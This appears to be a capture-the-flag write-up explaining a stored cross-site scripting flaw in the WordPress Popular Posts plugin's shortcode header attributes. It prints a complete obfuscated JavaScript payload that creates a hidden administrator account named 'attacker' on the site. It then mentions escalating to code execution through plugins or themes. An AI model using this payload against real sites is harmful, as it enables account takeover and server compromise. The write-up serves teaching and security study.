# Idea
Shitty plugin `wordpress popular posts` with shortcode support. Bug has been (unintentionally) fixed in more recent versions.

Shortcodes can be used by authors in posts, although they are most likely only used for widgets.

The `wpp` shortcode can be used to trigger a sneaky XSS. This plugin allows custom HTML tags, but this runs through a sanitizer. Hence only certain tags (like `h1, b, ul,` ...) and specific attributes are allowed. As custom HTML tags are sanitized, this is a red harring.

File `wordpress-popular-posts-4.2.2\public\class-wordpress-popular-posts-public.php` (Line 369ff) contains this code:

```php
// is there a title defined by user?
if (
    !empty( $header )
    && !empty( $header_start )
    && !empty( $header_end )
) {
    $shortcode_content .= htmlspecialchars_decode( $header_start, ENT_QUOTES ) . apply_filters( 'widget_title', $header ) . htmlspecialchars_decode( $header_end, ENT_QUOTES );
}
```

`$header`, `$header_start` and `$header_end` are set by the user provided shorttags (c.f. `shortcode_atts`). As `htmlspecialchars_decode` is used to generate raw HTML output (god knows why), we can use html **ENCODED** custom tags to bypass the intial HTML filter. During generation of the shorttag HTML code, the previously encoded data gets decoded and we get our XSS :)

## Full solution
Payload for final Post:
```
[wpp post_html='stuff' header='Popular Posts' header_start='<h3>&lt;script&gt;eval(String.fromCharCode(118,97,114,32,97,106,97,120,82,101,113,117,101,115,116,61,110,101,119,32,88,77,76,72,116,116,112,82,101,113,117,101,115,116,44,114,101,113,117,101,115,116,85,82,76,61,34,47,119,112,45,97,100,109,105,110,47,117,115,101,114,45,110,101,119,46,112,104,112,34,44,110,111,110,99,101,82,101,103,101,120,61,47,115,101,114,34,32,118,97,108,117,101,61,34,40,91,94,34,93,42,63,41,34,47,103,59,97,106,97,120,82,101,113,117,101,115,116,46,111,112,101,110,40,34,71,69,84,34,44,114,101,113,117,101,115,116,85,82,76,44,33,49,41,44,97,106,97,120,82,101,113,117,101,115,116,46,115,101,110,100,40,41,59,118,97,114,32,110,111,110,99,101,77,97,116,99,104,61,110,111,110,99,101,82,101,103,101,120,46,101,120,101,99,40,97,106,97,120,82,101,113,117,101,115,116,46,114,101,115,112,111,110,115,101,84,101,120,116,41,44,110,111,110,99,101,61,110,111,110,99,101,77,97,116,99,104,91,49,93,44,112,97,114,97,109,115,61,34,97,99,116,105,111,110,61,99,114,101,97,116,101,117,115,101,114,38,95,119,112,110,111,110,99,101,95,99,114,101,97,116,101,45,117,115,101,114,61,34,43,110,111,110,99,101,43,34,38,117,115,101,114,95,108,111,103,105,110,61,97,116,116,97,99,107,101,114,38,101,109,97,105,108,61,97,116,116,97,99,107,101,114,64,115,105,116,101,46,99,111,109,38,112,97,115,115,49,61,97,116,116,97,99,107,101,114,38,112,97,115,115,50,61,97,116,116,97,99,107,101,114,38,114,111,108,101,61,97,100,109,105,110,105,115,116,114,97,116,111,114,34,59,40,97,106,97,120,82,101,113,117,101,115,116,61,110,101,119,32,88,77,76,72,116,116,112,82,101,113,117,101,115,116,41,46,111,112,101,110,40,34,80,79,83,84,34,44,114,101,113,117,101,115,116,85,82,76,44,33,48,41,44,97,106,97,120,82,101,113,117,101,115,116,46,115,101,116,82,101,113,117,101,115,116,72,101,97,100,101,114,40,34,67,111,110,116,101,110,116,45,84,121,112,101,34,44,34,97,112,112,108,105,99,97,116,105,111,110,47,120,45,119,119,119,45,102,111,114,109,45,117,114,108,101,110,99,111,100,101,100,34,41,44,97,106,97,120,82,101,113,117,101,115,116,46,115,101,110,100,40,112,97,114,97,109,115,41,59))&lt;/script&gt;' header_end='</h3>']
```

Adds an user "attacker:attacker" with admin rights to WP. From there on RCE via Plugins/Themes/whatever to get the flag